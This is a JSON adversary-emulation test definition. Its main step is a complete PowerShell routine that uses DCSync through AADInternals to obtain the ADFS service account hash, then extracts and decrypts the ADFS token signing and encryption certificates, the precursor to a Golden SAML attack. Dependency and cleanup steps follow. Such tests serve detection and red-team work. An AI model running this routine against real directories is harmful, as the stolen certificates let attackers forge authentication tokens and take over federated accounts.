{
  "id": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
  "name": "ADFS token signing and encryption certificates theft - Remote",
  "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "d96994ad-35ae-4161-b4d3-2b8412d49529",
      "type": "execute-command",
      "data": {
        "command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5810e6cc-f243-4f2f-97e0-3e904b79e5a6",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "8fd17b7e-64c5-494d-bafc-e7712fc39367",
      "name": "Check dependency 1/1",
      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "b723ac18-dc78-4129-aba1-f9447aff6880",
      "name": "Resolve dependency 1/1",
      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AADInternals -Force",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "0fdef7b1-b475-42b4-ac1f-6110c11fb455",
      "name": "Re-check dependency 1/1",
      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "d96994ad-35ae-4161-b4d3-2b8412d49529",
      "p": "on-success",
      "o": "5810e6cc-f243-4f2f-97e0-3e904b79e5a6"
    },
    {
      "s": "d96994ad-35ae-4161-b4d3-2b8412d49529",
      "p": "on-failure",
      "o": "5810e6cc-f243-4f2f-97e0-3e904b79e5a6"
    },
    {
      "s": "8fd17b7e-64c5-494d-bafc-e7712fc39367",
      "p": "on-success",
      "o": "d96994ad-35ae-4161-b4d3-2b8412d49529"
    },
    {
      "s": "8fd17b7e-64c5-494d-bafc-e7712fc39367",
      "p": "on-failure",
      "o": "b723ac18-dc78-4129-aba1-f9447aff6880"
    },
    {
      "s": "b723ac18-dc78-4129-aba1-f9447aff6880",
      "p": "on-success",
      "o": "0fdef7b1-b475-42b4-ac1f-6110c11fb455"
    },
    {
      "s": "0fdef7b1-b475-42b4-ac1f-6110c11fb455",
      "p": "on-failure",
      "o": "d96994ad-35ae-4161-b4d3-2b8412d49529"
    }
  ],
  "tags": [
    "T1552",
    "T1552.004"
  ],
  "input_arguments": [
    {
      "name": "adfs_service_account_name",
      "type": "string",
      "description": "Name of the ADFS service account",
      "value": "adfs_svc"
    },
    {
      "name": "replication_user",
      "type": "string",
      "description": "Username with replication rights. It can be the Domain Admin running the script",
      "value": "Administrator"
    },
    {
      "name": "replication_password",
      "type": "string",
      "description": "Password of replication_username",
      "value": "ReallyStrongPassword"
    },
    {
      "name": "adfs_server_name",
      "type": "string",
      "description": "Name of an ADFS server",
      "value": "sts.contoso.com"
    }
  ]
}